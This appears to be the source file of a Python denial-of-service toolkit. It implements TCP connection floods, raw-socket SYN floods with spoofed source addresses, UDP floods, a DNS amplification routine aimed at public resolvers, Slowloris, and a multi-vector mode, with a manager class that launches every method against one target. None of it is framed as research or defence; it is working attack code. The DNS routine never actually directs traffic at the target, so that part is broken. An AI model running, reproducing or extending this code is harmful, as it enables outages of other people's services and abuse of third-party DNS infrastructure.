import asyncio, socket, struct, random, time, os, sys, ssl as ssl_module
from typing import Dict, List, Optional, Tuple

IS_WINDOWS = sys.platform == "win32"

PUBLIC_DNS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "149.112.112.112", "208.67.222.222", "208.67.220.220",
    "64.6.64.6", "64.6.65.6", "8.26.56.26", "8.20.247.20",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 Safari/604.1",
]

HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS"]

def _fast_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


class TcpConnectionFlood:
    """TCP Connection Flood V4 — Simple, reliable, works on all platforms.
    Opens connection with SSL support, sends HTTP request, closes. Repeat."""
    def __init__(self):
        self.name = "TCP Connection Flood V4"
        self.sent = 0
        self.failed = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 500, port: int = 0) -> Dict:
        self.sent = 0
        self.failed = 0
        
        # Parse target
        is_https = target.startswith("https://")
        target_clean = target.replace("https://", "").replace("http://", "").split("/")[0]
        
        try:
            ip = socket.gethostbyname(target_clean.split(":")[0])
        except:
            return {"sent": 0, "failed": 0, "error": "resolve failed"}
        
        host = target_clean.split(":")[0]
        
        # Determine port
        if port:
            dst_port = port
        elif ":" in target_clean:
            dst_port = int(target_clean.split(":")[1])
        else:
            dst_port = 443 if is_https else 80
        
        # SSL context for HTTPS
        ssl_ctx = None
        if dst_port in (443, 8443):
            ssl_ctx = ssl_module.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl_module.CERT_NONE
        
        end = time.time() + duration
        
        async def _worker():
            local_sent = 0
            local_failed = 0
            while time.time() < end:
                try:
                    # Open connection
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(ip, dst_port, ssl=ssl_ctx),
                        timeout=5
                    )
                    
                    # Send HTTP request
                    path = f"/?{random.randint(0,999999)}"
                    req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    ).encode()
                    
                    w.write(req)
                    await asyncio.wait_for(w.drain(), timeout=3)
                    
                    # Read response
                    try:
                        await asyncio.wait_for(r.read(1024), timeout=2)
                    except:
                        pass
                    
                    w.close()
                    await w.wait_closed()
                    
                    self.sent += 1
                    local_sent += 1
                    
                except:
                    self.failed += 1
                    local_failed += 1
                    await asyncio.sleep(0.01)
            
            return {"sent": local_sent, "failed": local_failed}
        
        # Create workers
        num_workers = min(threads, 1000)
        workers = [asyncio.create_task(_worker()) for _ in range(num_workers)]
        await asyncio.gather(*workers, return_exceptions=True)
        
        return {"sent": self.sent, "failed": self.failed}


class SynFloodV5:
    """SYN Flood — raw socket on Linux, TCP Connection on Windows"""
    def __init__(self):
        self.name = "SYN Flood V5"
        self.sent = 0
        self.failed = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads * 3)
        
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "failed": 0, "error": "resolve failed"}
        
        port = int(target.split(":")[1]) if ":" in target else 80
        dst_ports = [port, 80, 443, 8080]
        end = time.time() + duration

        async def syn_one(sp, dp):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sip = socket.inet_aton(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
                dip = socket.inet_aton(ip)
                ip_hdr = struct.pack("!BBHHHBBH4s4s", (4<<4)+5, 0, 40, random.randint(1,65535), 0, 255, socket.IPPROTO_TCP, 0, sip, dip)
                tcp_hdr = struct.pack("!HHLLBBHHH", sp, dp, random.randint(0,4294967295), 0, (5<<4)+0, 0x02, socket.htons(65535), 0, 0)
                ps_hdr = struct.pack("!4s4sBBH", sip, dip, 0, socket.IPPROTO_TCP, len(tcp_hdr))
                cks = _fast_checksum(ps_hdr + tcp_hdr)
                tcp_hdr = struct.pack("!HHLLBBHHH", sp, dp, random.randint(0,4294967295), 0, (5<<4)+0, 0x02, socket.htons(65535), socket.htons(cks), 0)
                sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
                self.sent += 1
                sock.close()
            except:
                self.failed += 1

        while time.time() < end:
            tasks = [syn_one(random.randint(1024,65535), random.choice(dst_ports)) for _ in range(min(threads, 200))]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        return {"sent": self.sent, "failed": self.failed}


class UdpFloodV5:
    """UDP Flood V4 — simple and reliable."""
    def __init__(self):
        self.name = "UDP Flood V4"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 500) -> Dict:
        self.sent = 0
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"sent": 0, "error": "resolve failed"}
        
        ports = [80, 443, 8080, 53, 123]
        payloads = [os.urandom(random.randint(64, 1400)) for _ in range(10)]
        end = time.time() + duration

        async def _worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                try:
                    sock.sendto(random.choice(payloads), (ip, random.choice(ports)))
                    self.sent += 1
                except:
                    pass
            sock.close()

        workers = [asyncio.create_task(_worker()) for _ in range(min(threads, 300))]
        await asyncio.gather(*workers, return_exceptions=True)
        return {"sent": self.sent}


class DnsAmplificationFlood:
    """DNS Amplification — ~40x amplification."""
    def __init__(self):
        self.name = "DNS Amplification"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        self.sent = 0
        resolvers = PUBLIC_DNS[:]
        end = time.time() + duration

        async def _worker(rlist):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                for r in rlist:
                    try:
                        tid = random.randint(0, 65535)
                        q = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + b"\x03isc\x03org\x00\x00\xFF\x00\x01"
                        sock.sendto(q, (r, 53))
                        self.sent += 1
                    except:
                        pass
            sock.close()

        num = min(threads, 30)
        chunk = max(1, len(resolvers) // num)
        chunks = [resolvers[i:i+chunk] for i in range(0, len(resolvers), chunk)]
        workers = [asyncio.create_task(_worker(c)) for c in chunks]
        await asyncio.gather(*workers, return_exceptions=True)
        return {"sent": self.sent}


class IcmpFloodV5:
    def __init__(self):
        self.name = "ICMP Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await UdpFloodV5().attack(target, duration, threads * 2)
        return {"sent": 0, "error": "not implemented"}


class TcpResetFlood:
    def __init__(self):
        self.name = "TCP RST Flood"
        self.sent = 0

    async def attack(self, target: str, duration: int = 30, threads: int = 100) -> Dict:
        if IS_WINDOWS:
            return await TcpConnectionFlood().attack(target, duration, threads * 2)
        return {"sent": 0, "error": "not implemented"}


class SlowLorisV5:
    """Slowloris — hold connections open."""
    def __init__(self):
        self.name = "Slowloris"
        self.active = 0

    async def attack(self, target: str, duration: int = 60, connections: int = 500) -> Dict:
        target = target.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(target.split(":")[0])
        except:
            return {"active_connections": 0, "error": "resolve failed"}
        
        host = target.split(":")[0]
        port = 443
        
        ssl_ctx = ssl_module.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl_module.CERT_NONE
        
        writers = []
        end = time.time() + duration

        async def open_conn():
            try:
                r, w = await asyncio.open_connection(ip, port, ssl=ssl_ctx)
                w.write(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                await w.drain()
                writers.append(w)
                self.active += 1
                return w
            except:
                pass
            return None

        async def keep_alive(w):
            while time.time() < end:
                try:
                    w.write(f"X-a: {random.randint(0,999999)}\r\n".encode())
                    await w.drain()
                    await asyncio.sleep(random.uniform(5, 15))
                except:
                    break

        for _ in range(min(connections, 500)):
            await open_conn()
            await asyncio.sleep(0.01)

        if writers:
            tasks = [keep_alive(w) for w in writers]
            await asyncio.gather(*tasks, return_exceptions=True)

        for w in writers:
            try: w.close()
            except: pass

        return {"active_connections": len(writers)}


class MultiVectorFlood:
    """Multi-Vector — TCP + UDP + DNS simultaneously."""
    def __init__(self):
        self.name = "Multi-Vector"
        self.stats = {}

    async def attack(self, target: str, duration: int = 30, threads: int = 500) -> Dict:
        stats = {}
        
        async def _run(cls, kw):
            r = await cls().attack(target, **kw)
            stats[cls.__name__] = r
            return r
        
        await asyncio.gather(
            _run(TcpConnectionFlood, {"duration": duration, "threads": threads//2}),
            _run(UdpFloodV5, {"duration": duration, "threads": threads//2}),
            _run(DnsAmplificationFlood, {"duration": duration, "threads": 30}),
            return_exceptions=True,
        )
        
        self.stats = stats
        total = sum(r.get("sent", 0) for r in stats.values())
        return {"sent": total, "stats": stats}


class L4AttackManager:
    def __init__(self):
        self.methods = {
            "syn": SynFloodV5(),
            "udp": UdpFloodV5(),
            "icmp": IcmpFloodV5(),
            "rst": TcpResetFlood(),
            "slowloris": SlowLorisV5(),
            "tcp_conn": TcpConnectionFlood(),
            "dns_amp": DnsAmplificationFlood(),
            "multi": MultiVectorFlood(),
        }

    async def launch_all(self, target: str, duration: int = 30) -> Dict:
        results = {}
        for name, method in self.methods.items():
            try:
                if name == "slowloris":
                    results[name] = await method.attack(target, duration=duration, connections=200)
                elif name == "multi":
                    results[name] = await method.attack(target, duration=duration, threads=300)
                elif name == "dns_amp":
                    results[name] = await method.attack(target, duration=duration, threads=30)
                else:
                    results[name] = await method.attack(target, duration=duration, threads=100)
            except Exception as e:
                results[name] = {"error": str(e)}
        return results

    async def probe_all(self, target: str) -> Dict:
        return {name: {"available": True} for name in self.methods}
